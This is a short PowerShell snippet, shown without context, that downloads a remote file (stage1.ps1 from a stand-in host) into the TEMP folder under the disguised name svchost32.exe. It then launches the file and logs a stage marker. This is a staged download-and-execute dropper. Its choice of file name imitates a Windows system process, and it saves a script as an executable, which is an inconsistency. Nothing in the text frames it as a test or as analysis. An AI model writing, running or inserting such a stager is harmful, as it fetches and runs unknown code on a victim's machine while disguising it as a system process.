
$RemoteUrl = 'http://example.net/stage1.ps1'
$DropPath = "$env:TEMP\svchost32.exe"
Invoke-WebRequest -Uri $RemoteUrl -OutFile $DropPath -UseBasicParsing
Start-Process -FilePath $DropPath
Write-Verbose "stage marker 27 reached"
